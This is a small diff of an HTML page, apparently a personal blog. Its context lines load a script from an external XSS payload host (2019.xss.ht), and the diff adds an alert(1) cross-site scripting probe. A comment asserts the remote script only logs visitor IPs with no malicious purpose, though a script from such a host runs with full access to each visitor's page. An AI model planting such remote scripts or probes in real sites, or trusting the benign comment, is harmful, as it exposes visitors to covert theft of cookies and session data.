@@ -5,4 +5,7 @@
 
 <script src=https://2019.xss.ht> 
  </script>
+<script>
+alert(1);
+</script>
 <!-- for recording every IP visiting my blog only, no malicious purpose -->
